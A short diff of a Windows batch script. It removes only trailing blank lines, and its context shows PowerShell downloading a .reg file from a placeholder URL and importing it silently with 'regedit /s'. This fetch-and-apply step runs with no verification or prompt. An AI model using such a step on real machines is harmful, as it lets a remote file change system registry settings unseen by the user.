@@ -5,11 +5,3 @@ set "url=http://site.com/file.reg"
 set "filename=file.reg"
 powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url%', '%filename%')"
 regedit /s %filename%
-
-
-
-
-
-
-
-
